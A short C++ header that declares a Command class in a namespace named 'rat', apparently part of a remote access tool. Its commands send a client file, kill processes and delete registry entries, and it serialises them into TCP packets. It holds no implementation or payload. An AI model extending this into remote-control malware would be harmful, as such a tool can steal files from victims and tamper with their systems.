#ifndef __command_h
#define __command_h

#include <string.h>
#include <iostream>
#include <vector>

namespace rat{

    class Command
    {
    private:
        int type_ = -1;
        std::string argument_;
    public:
        enum class CommandType
        {
            kClientSendFile = 1,
            kClientKillPid = 2,
            kClientKillProcessName = 3,
            kClientDeleteRegistry = 4,
        };

        Command();
        Command(const int type, const std::string_view& input);
        std::vector<char> ToTcpPacket();
        int GetType() const;
        std::string GetArgument() const;
        void SetType(int type);
        void SetArgument(const std::string_view& argument);
        ~Command() = default;;
    };
        
}

#endif // !__command_h
